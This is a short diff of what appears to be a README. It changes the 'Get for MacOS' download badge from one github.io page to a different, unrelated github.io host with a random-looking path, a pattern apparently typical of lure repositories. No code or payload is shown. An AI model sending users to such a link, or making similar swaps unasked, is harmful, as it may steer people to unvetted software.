@@ -8,7 +8,7 @@
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://stepan-apps-mac.github.io/.github/)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://apps-link-hub.github.io/.github/dfjhue)  
 
 </div>  
 
